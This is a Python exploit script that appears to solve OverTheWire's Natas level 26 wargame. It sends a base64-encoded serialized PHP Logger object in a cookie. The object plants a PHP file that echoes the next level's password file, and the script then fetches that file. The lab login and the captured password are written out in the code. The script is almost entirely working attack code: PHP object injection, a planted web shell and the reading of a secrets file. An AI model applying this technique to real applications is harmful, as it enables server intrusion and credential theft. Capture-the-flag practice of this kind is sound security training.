import requests
import base64
import re


url = 'http://natas26.natas.labs.overthewire.org/'
auth = requests.auth.HTTPBasicAuth('natas26','oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T')

# refer docs/obj_injection.php
# creating file `./img/abhay.php` that extracts password from `/etc/natas_webpass/natas27`

resp = requests.get(url, auth=auth, cookies={'drawing':'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMzoiaW1nL2FiaGF5LnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtOO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1OToiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsiO30='})

# if the file already exists, it will give an error
resp = requests.get(url+'img/abhay.php', auth=auth)
print(resp.text, end='') # 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ

